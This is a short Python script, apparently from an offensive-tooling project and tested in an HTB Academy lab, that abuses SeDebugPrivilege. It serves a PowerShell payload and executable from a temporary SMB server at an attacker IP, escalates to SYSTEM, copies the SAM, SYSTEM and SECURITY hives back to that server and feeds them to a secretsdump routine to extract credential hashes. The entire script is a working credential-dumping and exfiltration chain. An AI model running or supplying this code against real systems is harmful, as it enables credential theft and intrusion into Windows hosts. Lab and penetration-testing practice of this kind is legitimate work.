# This example can be used for SeDebugPrivileged users
# Tested on HTB Academy

from payload import SamDumpPowershell, CRunPowershellExe
from tempsmbserver import TempSMB
from stolen_tools.steal_tools import provide_get_system
from stolen_from_impacket.secretsdump import dump

local_ip = "10.10.16.101"

with TempSMB(local_ip=local_ip) as smb:
    sam_dump_payload = SamDumpPowershell(smb)
    get_system_powershell_script = provide_get_system(sam_dump_payload.file.remote_path)
    get_system_powershell_file = smb.create_temp_file(get_system_powershell_script, ext=".ps1")
    get_system_exe = CRunPowershellExe(smb, [get_system_powershell_file])


    print(f"{"="*10}ANGRY SMB READY{"="*10}")
    print(get_system_exe.file.remote_path)
    print(f"{"="*10}waiting{"="*10}")

    sam_dump_payload.await_output_files()
    try:
        dump(sam_dump_payload.sam.local_path, sam_dump_payload.system.local_path, sam_dump_payload.security.local_path)
    except Exception as e:
        print(e)
        print("Sleep timer for awaiting the dumped files might be too short")
